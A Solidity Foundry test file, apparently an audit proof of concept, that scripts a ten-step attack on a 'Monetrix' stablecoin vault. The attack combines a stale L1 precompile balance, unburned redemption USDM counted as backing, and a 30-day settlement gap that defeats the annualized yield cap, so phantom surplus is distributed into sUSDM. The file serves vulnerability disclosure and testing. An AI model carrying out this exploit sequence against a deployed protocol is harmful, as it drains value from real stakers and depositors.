// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts via harness, mock core writer, set high L1 backing (stale precompile)
// 2. [T=0] Attacker deposits 500k USDC, receives USDM
// 3. [T=0] Attacker stakes 100k USDM into sUSDM (needed for yield distribution target)
// 4. [T=6h] Keeper bridges principal to L1, outstandingL1Principal = 500k
// 5. [T=6h] Attacker "drains" L1 assets in reality, but L1→L2 precompile is stale - still reports 500k
// 6. [T=6h] Attacker requests redemption of 400k USDM - USDM moves to vault (not burned), USDC not in escrow
//    → totalBackingSigned() counts: stale L1 (500k) + USDM in vault (400k) = 900k phantom backing
//    → surplus() reports massive phantom profit
// 7. [T=6h+30days] Warp 30 days forward - long settlement gap makes annualized yield cap unbounded
// 8. [T=30days] Operator calls settleDailyPnL - Gate 4 (annualized cap) passes due to elapsed time
//    → Entire phantom surplus declared as distributable yield
// 9. [T=30days] Yield distributed into sUSDM - exchange rate inflates with phantom value
// 10. [Assert] sUSDM totalAssets increased by phantom amount; attacker's sUSDM shares now worth more than real backing

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/core/YieldEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/interfaces/HyperCoreConstants.sol";

contract AuditAgentPoC is ToL1WeiHarness {

    function test_staleL1_phantomSurplus_unboundedYield() public {
        // === STEP 1: Setup - mock core writer and set stale high L1 backing ===
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);

        // Precompile reports 500k USDC on L1 (stale - real L1 balance is 0 after attacker drains)
        _mockVaultL1SpotUsdc(500_000e6);

        address attacker = address(0xBEEF);
        vm.deal(attacker, 10 ether);

        // === STEP 2: Attacker deposits 500k USDC → gets 500k USDM ===
        _depositAs(attacker, 500_000e6);
        console.log("Step 2: attacker USDM balance =", usdm.balanceOf(attacker));

        // === STEP 3: Attacker stakes 100k USDM into sUSDM ===
        _stakeAs(attacker, 100_000e6);
        uint256 attackerSusdmShares = susdm.balanceOf(attacker);
        console.log("Step 3: attacker sUSDM shares =", attackerSusdmShares);

        // === STEP 4: Bridge to L1 (T = 6 hours) ===
        vm.warp(block.timestamp + 6 hours);
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        assertEq(vault.outstandingL1Principal(), 500_000e6, "L1 principal should be 500k after bridge");
        console.log("Step 4: outstandingL1Principal =", vault.outstandingL1Principal());

        // === STEP 5: Attacker drains L1 assets, but precompile is STALE ===
        // The mock still returns 500k - this simulates the stale L1→L2 precompile state
        // In reality, attacker has withdrawn their L1 perp positions / spot USDC
        // Real L1 balance = 0, but _readL1Backing() still returns 500k
        int256 backingBeforeRedeem = accountant.totalBackingSigned();
        console.log("Step 5: totalBackingSigned (stale L1) =", uint256(backingBeforeRedeem));

        // === STEP 6: Attacker requests 400k redemption while L1 state is stale ===
        // USDM moves to vault (not burned yet), USDC not yet in RedeemEscrow
        // This creates the SECOND layer of phantom surplus:
        //   totalBackingSigned = stale L1 (500k) + USDM in vault (400k) = doubly inflated
        vm.startPrank(attacker);
        usdm.approve(address(vault), 400_000e6);
        uint256 reqId = vault.requestRedeem(400_000e6);
        vm.stopPrank();

        int256 backingAfterRedeem = accountant.totalBackingSigned();
        int256 phantomSurplus = accountant.surplus();
        console.log("Step 6: totalBackingSigned after redeem =", uint256(backingAfterRedeem));
        console.log("Step 6: surplus (phantom) =", uint256(phantomSurplus));

        // The surplus should be inflated due to stale L1 + redemption accounting gap
        assertGt(phantomSurplus, 0, "phantom surplus should exist from stale L1 + redeem gap");

        // === STEP 7: Warp 30 days forward - long settlement gap ===
        // This makes the annualized yield cap (Gate 4) unbounded:
        //   annualizedYield = proposedYield * 365 / daysSinceSettlement
        //   With 30 days elapsed, even large proposedYield passes the cap
        vm.warp(block.timestamp + 30 days);
        console.log("Step 7: warped 30 days, timestamp =", block.timestamp);

        // === STEP 8: Settle daily PnL - phantom surplus passes as distributable yield ===
        // The unbounded yield cap after 30-day gap allows the entire phantom amount
        // to be declared as distributable yield
        uint256 proposedYield = uint256(phantomSurplus);
        console.log("Step 8: proposedYield (phantom) =", proposedYield);

        vm.prank(operator);
        uint256 distributable = vault.settle(proposedYield);
        console.log("Step 8: distributable yield from phantom =", distributable);

        // Gate 4 should have been bypassed due to elapsed time - distributable > 0
        assertGt(distributable, 0, "phantom surplus passed Gate 4 as distributable yield");

        // === STEP 9: Distribute yield into sUSDM - inflates exchange rate with phantom value ===
        // Simulate yield arriving (mint USDC to yieldEscrow as L1 yield collection)
        usdc.mint(address(yieldEscrow), distributable);

        vm.prank(operator);
        vault.distributeYield();

        uint256 susdmTotalAssets = susdm.totalAssets();
        console.log("Step 9: sUSDM totalAssets after phantom yield =", susdmTotalAssets);

        // === STEP 10: Assert - attacker's sUSDM shares are now worth phantom value ===
        // The sUSDM exchange rate has been inflated by phantom yield
        // Attacker's shares * new rate > real backing they contributed
        uint256 attackerShareValue = (attackerSusdmShares * susdmTotalAssets) / susdm.totalSupply();
        console.log("Step 10: attacker sUSDM share value =", attackerShareValue);

        // The attacker staked 100k USDM but their shares are now worth more
        // because phantom yield was injected into sUSDM
        assertGt(
            susdmTotalAssets,
            100_000e6,
            "sUSDM totalAssets inflated by phantom yield beyond real deposits"
        );

        // The distributable yield from phantom surplus should be substantial
        // (proving the unbounded yield cap allowed extraction)
        assertGt(
            distributable,
            1_000e6,
            "phantom yield extracted via unbounded annualized cap after settlement gap"
        );

        // Final proof: backing is overstated vs real assets
        // Real assets = USDC in vault + escrow (much less than reported backing)
        uint256 realUsdcInProtocol = usdc.balanceOf(address(vault))
            + usdc.balanceOf(address(redeemEscrow))
            + usdc.balanceOf(address(yieldEscrow));
        console.log("Step 10: real USDC in protocol =", realUsdcInProtocol);
        console.log("Step 10: reported totalBacking =", accountant.totalBacking());

        assertGt(
            accountant.totalBacking(),
            realUsdcInProtocol,
            "totalBacking overstated vs real USDC - stale L1 precompile + redeem gap"
        );
    }
}
